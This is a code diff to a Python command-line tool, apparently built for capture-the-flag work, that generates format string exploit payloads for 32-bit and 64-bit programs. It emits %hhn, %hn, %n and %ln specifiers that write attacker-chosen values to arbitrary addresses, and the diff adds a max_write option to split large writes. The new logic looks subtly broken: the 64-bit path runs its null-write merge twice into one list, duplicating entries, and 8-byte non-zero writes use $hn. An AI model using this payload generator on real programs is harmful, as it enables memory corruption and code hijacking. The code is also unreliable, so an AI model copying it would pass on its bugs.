@@ -2,11 +2,12 @@ from colorama import Fore, Style
 import argparse
 
 class FormatString64:
-	def __init__(self,writes: dict,offset=1,append=''):
+	def __init__(self,writes: dict,offset=1,append='',max_write=0):
 		self.writes = writes
 		#self.prepend = prepend.encode()
 		self.append = append.encode()
 		self.offset = offset
+		self.max_write = max_write # 0 means no limit
 		self.formatString = b''
 		self.padding = 0
 
@@ -34,7 +35,7 @@ class FormatString64:
 		# Define addresses
 		# Each address is split into 4 separate addresses for each word of the desired 64-bit region
 		parsedWrites = self._parseDictToList(self.writes)
-		splitWrites = self._splitWrites(parsedWrites)
+		splitWrites = self._splitWrites(parsedWrites) # Split AND optimized!
 		addresses = b''
 		for address,data,size in splitWrites:
 			addresses += self._intToPointer64(address)
@@ -75,6 +76,9 @@ class FormatString64:
 	# Splits one write into four writes or less, based on values to write
 	def _splitWrites(self,tuples):
 		initialList = []
+		firstOptList = []
+		secondOptList = []
+		thirdOptList = []
 		finalList = []
 		# Split in four
 		for entry in tuples:
@@ -83,11 +87,53 @@ class FormatString64:
 		# Check for consecutive null-byte writes for optimization
 		for index in range(0,len(initialList)-1,2):
 			if initialList[index+1][0] - initialList[index][0] == 2 and initialList[index][1] + initialList[index+1][1] == 0:
-				finalList.append((initialList[index][0],initialList[index][1],4))
+				firstOptList.append((initialList[index][0],initialList[index][1],4))
 			else:
-				finalList.append((initialList[index][0],initialList[index][1],2))
-				finalList.append((initialList[index+1][0],initialList[index+1][1],2))
-
+				firstOptList.append((initialList[index][0],initialList[index][1],2))
+				firstOptList.append((initialList[index+1][0],initialList[index+1][1],2))
+		# Half write sizes (quad word, double word, word, byte) until optimized
+		finalList = firstOptList
+		if self.max_write:
+			# Optimize and split
+			for index in range(0,len(firstOptList)):
+				if firstOptList[index][1] > self.max_write:
+					address,data,size = firstOptList[index]
+					splitData = self._splitData(data,size)
+					secondOptList.append((address,splitData[0],size//2))
+					secondOptList.append((address+(size//2),splitData[1],size//2))
+				else:
+					address,data,size = firstOptList[index]
+					secondOptList.append((address,data,size))
+			finalList = secondOptList
+		# Finally reduce null-byte writes
+		sortedList = sorted(finalList, key=lambda x:x[0])
+		for index,entry in enumerate(sortedList[:-1]):
+			address,data,size = entry
+			if data == 0 and sortedList[index+1][0] - address == 2 and sortedList[index+1][2] == 2:
+				thirdOptList.append((address,sortedList[index+1][1],size*2))
+			else:
+				thirdOptList.append((address,data,size))
+		finalList = thirdOptList
+		# Finally reduce null-byte writes
+		sortedList = sorted(finalList, key=lambda x:x[0])
+		done = False
+		i = 0
+		while not done:
+			address,data,size = sortedList[i]
+			if sortedList[i+1][1] == 0 and sortedList[i+1][0] - address == 2 and sortedList[i+1][2] == 2 and size == 2:
+				thirdOptList.append((address,data,size*2))
+				i += 1
+			else:
+				thirdOptList.append((address,data,size))
+			i += 1
+			if i >= len(sortedList)-1:
+				try:
+					thirdOptList.append((sortedList[i][0],sortedList[i][1],sortedList[i][2]))
+					done = True
+				except:
+					done = True
+		finalList = thirdOptList
+		# Sort and return
 		return sorted(finalList,key=lambda x: x[1])
 
 	# This function relies on the 'writes' parameter being sorted by index 1 in each element.
@@ -98,6 +144,8 @@ class FormatString64:
 		for address,data,size in writes:
 			if data == 0:
 				match size:
+					case 1:
+						formatSpecifiers += b'%#NUM#$hhn'
 					case 2:
 						formatSpecifiers += b'%#NUM#$hn'
 					case 4:
@@ -106,10 +154,27 @@ class FormatString64:
 						formatSpecifiers += b'%#NUM#$ln'
 			else:
 				if data - totalWritten != 0:
-					formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hn'
+					match size:
+						case 1:
+							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hhn'
+						case 2:
+							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hn'
+						case 4:
+							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$n'
+						case 8:
+							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hn'
 					totalWritten += (data - totalWritten)
 				else:
-					formatSpecifiers += b'%#NUM#$hn'
+					match size:
+						case 1:
+							formatSpecifiers += b'%#NUM#$hhn'
+						case 2:
+							formatSpecifiers += b'%#NUM#$hn'
+						case 4:
+							formatSpecifiers += b'%#NUM#$n'
+						case 8:
+							formatSpecifiers += b'%#NUM#$ln'
+	
 		return formatSpecifiers
 
 	def _craftFinalString(self,formatSpecifiers,addresses):
@@ -159,12 +224,24 @@ class FormatString64:
 			strlen += len(str(num))
 		return strlen
 
+	def _splitData(self,num,length):
+		splitData = []
+		match length:
+			case 2:
+				splitData.append(num & 0xFF)
+				splitData.append((num >> 8) & 0xFF)
+			case 4:
+				splitData.append(num & 0xFFFF)
+				splitData.append((num >> 16) & 0xFFFF)
+		return splitData
+
 class FormatString32:
-	def __init__(self,writes: dict,offset=0,append=''):
+	def __init__(self,writes: dict,offset=0,append='',max_write=0):
 		self.writes = writes
 		#self.prepend = prepend.encode()
 		self.append = append.encode()
 		self.offset = offset
+		self.max_write = max_write # 0 means no limit
 		self.formatString = b''
 		self.padding = 0
 
@@ -233,6 +310,9 @@ class FormatString32:
 	# Splits one write into four writes or less, based on values to write
 	def _splitWrites(self,tuples):
 		initialList = []
+		firstOptList = []
+		secondOptList = []
+		thirdOptList = []
 		finalList = []
 		# Split in four
 		for entry in tuples:
@@ -242,11 +322,41 @@ class FormatString32:
 		# This is more relevant for the 64-bit class, but i still left it in just in case
 		for index in range(0,len(initialList)-1,2):
 			if initialList[index+1][0] - initialList[index][0] == 2 and initialList[index][1] + initialList[index+1][1] == 0:
-				finalList.append((initialList[index][0],initialList[index][1],4))
+				firstOptList.append((initialList[index][0],initialList[index][1],4))
 			else:
-				finalList.append((initialList[index][0],initialList[index][1],2))
-				finalList.append((initialList[index+1][0],initialList[index+1][1],2))
-
+				firstOptList.append((initialList[index][0],initialList[index][1],2))
+				firstOptList.append((initialList[index+1][0],initialList[index+1][1],2))
+		finalList = firstOptList
+		if self.max_write:
+			# Optimize and split
+			for index in range(0,len(firstOptList)):
+				if firstOptList[index][1] > self.max_write:
+					address,data,size = firstOptList[index]
+					splitData = self._splitData(data,size)
+					secondOptList.append((address,splitData[0],size//2))
+					secondOptList.append((address+(size//2),splitData[1],size//2))
+				else:
+					secondOptList.append((firstOptList[index][0],firstOptList[index][1],firstOptList[index][2]))
+			finalList = secondOptList
+		# Finally reduce null-byte writes
+		sortedList = sorted(finalList, key=lambda x:x[0])
+		done = False
+		i = 0
+		while not done:
+			address,data,size = sortedList[i]
+			if sortedList[i+1][1] == 0 and sortedList[i+1][0] - address == 2 and sortedList[i+1][2] == 2 and size == 2:
+				thirdOptList.append((address,data,size*2))
+				i += 1
+			else:
+				thirdOptList.append((address,data,size))
+			i += 1
+			if i >= len(sortedList)-1:
+				try:
+					thirdOptList.append((sortedList[i][0],sortedList[i][1],sortedList[i][2]))
+					done = True
+				except:
+					done = True
+		finalList = thirdOptList
 		return sorted(finalList,key=lambda x: x[1])
 
 	# This function relies on the 'writes' parameter being sorted by index 1 in each element
@@ -256,6 +366,8 @@ class FormatString32:
 		for address,data,size in writes:
 			if data == 0:
 				match size:
+					case 1:
+						formatSpecifiers += b'%#NUM#$hhn'
 					case 2:
 						formatSpecifiers += b'%#NUM#$hn'
 					case 4:
@@ -264,10 +376,26 @@ class FormatString32:
 						formatSpecifiers += b'%#NUM#$ln'
 			else:
 				if data - totalWritten != 0:
-					formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hn'
+					match size:
+						case 1:
+							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hhn'
+						case 2:
+							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hn'
+						case 4:
+							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$n'
+						case 8:
+							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hn'
 					totalWritten += (data - totalWritten)
 				else:
-					formatSpecifiers += b'%#NUM#$hn'
+					match size:
+						case 1:
+							formatSpecifiers += b'%#NUM#$hhn'
+						case 2:
+							formatSpecifiers += b'%#NUM#$hn'
+						case 4:
+							formatSpecifiers += b'%#NUM#$n'
+						case 8:
+							formatSpecifiers += b'%#NUM#$ln'
 		return formatSpecifiers
 
 	def _craftFinalString(self,formatSpecifiers,addresses):
@@ -316,6 +444,17 @@ class FormatString32:
 		for num in intList:
 			strlen += len(str(num))
 		return strlen
+	
+	def _splitData(self,num,length):
+		splitData = []
+		match length:
+			case 2:
+				splitData.append(num & 0xFF)
+				splitData.append((num >> 8) & 0xFF)
+			case 4:
+				splitData.append(num & 0xFFFF)
+				splitData.append((num >> 16) & 0xFFFF)
+		return splitData
 
 def main():
 	# Handle cli use
@@ -323,6 +462,7 @@ def main():
 	argParser.add_argument('-w','--write',action='append',required=True,help=f'{Style.BRIGHT}REQUIRED{Style.RESET_ALL} - Specify a single address:data pair in hex, i.e 0x404000:0x1337. Can be used multiple times.',type=str)
 	argParser.add_argument('--arch',choices=['32','64'],required=True,help=f'{Style.BRIGHT}REQUIRED{Style.RESET_ALL} - Specify either 32-bit or 64-bit architecture')
 	argParser.add_argument('-o','--offset',default=0,help='Specify the offset at which your input is found using a format string vulnerability',type=int)
+	argParser.add_argument('-m','--max',default=0,help='Specify a maximum amount of bytes each format specifier can write. (use this if the payload is crashing your terminal)',type=int)
 	#argParser.add_argument('-p','--prepend',default='',help='Specify a string to prepend to the payload',type=str)
 	argParser.add_argument('-a','--append',default='',help='Specify a string to append to the payload',type=str)
 	argParser.add_argument('-r','--raw',action='store_true',help='Outputs the only final payload as raw bytes.')
@@ -331,10 +471,10 @@ def main():
 	writes = parseWrites(args['write'])
 	if args['arch'] == '32':
 		FormatString64.unnecessaryHeader()
-		fmtstr = FormatString32(writes=writes,append=args['append'],offset=args['offset'])
+		fmtstr = FormatString32(writes=writes,max_write=args['max'],append=args['append'],offset=args['offset'])
 	elif args['arch'] == '64':
 		FormatString32.unnecessaryHeader()
-		fmtstr = FormatString64(writes=writes,append=args['append'],offset=args['offset'])
+		fmtstr = FormatString64(writes=writes,max_write=args['max'],append=args['append'],offset=args['offset'])
 	
 	if args['raw']:
 		print(fmtstr._createFormatString().decode())
